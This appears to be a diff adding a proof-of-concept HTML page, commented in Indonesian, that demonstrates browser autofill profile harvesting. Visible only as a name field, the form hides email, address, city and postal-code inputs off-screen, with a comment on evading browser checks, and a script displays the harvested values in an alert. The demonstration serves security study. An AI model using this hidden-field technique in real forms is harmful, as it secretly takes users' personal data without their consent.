@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC Autofill Profile Harvesting</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; }
+        input[type="text"], input[type="email"] { padding: 8px; width: 250px; }
+
+        /* TEKNIK MENYEMBUNYIKAN KOLOM SENSITIF */
+        .hidden-fields {
+            /* Jangan gunakan display: none; karena beberapa browser pintar langsung mengabaikannya.
+               Gunakan kombinasi opacity, height, atau absolute positioning agar browser mengira elemen ini tetap ada di layar. */
+            opacity: 0;
+            position: absolute;
+            left: -9999px; /* Melempar kolom keluar dari area pandang layar */
+            height: 0;
+            width: 0;
+            overflow: hidden;
+        }
+
+        button { padding: 10px 20px; background-color: blue; color: white; border: none; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <h2>Form Pendaftaran (PoC Honeypot)</h2>
+    <p><em>Skenario: Korban mengira hanya mengisi Nama Lengkap untuk mendaftar.</em></p>
+
+    <form id="pocForm" onsubmit="tampilkanDataDicuri(event)">
+        
+        <div class="form-group">
+            <label for="name">Nama Lengkap:</label>
+            <input type="text" id="name" name="name" autocomplete="name" required placeholder="Klik di sini untuk isi nama...">
+        </div>
+
+        <div class="hidden-fields">
+            <input type="email" id="email" name="email" autocomplete="email">
+            <input type="text" id="address" name="address" autocomplete="street-address">
+            <input type="text" id="city" name="city" autocomplete="address-level2">
+            <input type="text" id="zip" name="zip" autocomplete="postal-code">
+        </div>
+
+        <button type="submit">Kirim Data</button>
+    </form>
+
+    <script>
+        function tampilkanDataDicuri(event) {
+            event.preventDefault();
+            
+            // Ambil nilai dari kolom-kolom yang disembunyikan
+            const nama = document.getElementById('name').value;
+            const email = document.getElementById('email').value;
+            const address = document.getElementById('address').value;
+            const city = document.getElementById('city').value;
+            const zip = document.getElementById('zip').value;
+
+            // Tampilkan alert/log sebagai bukti bahwa data sensitif berhasil dipanen diam-diam
+            alert(
+                `BOOM! Data Sensitif Berhasil Dicuri!\n\n` +
+                `Nama (Terlihat): ${nama}\n` +
+                `Email (Tersembunyi): ${email}\n` +
+                `Alamat (Tersembunyi): ${address}\n` +
+                `Kota (Tersembunyi): ${city}\n` +
+                `Kode Pos (Tersembunyi): ${zip}`
+            );
+        }
+    </script>
+
+</body>
+</html>
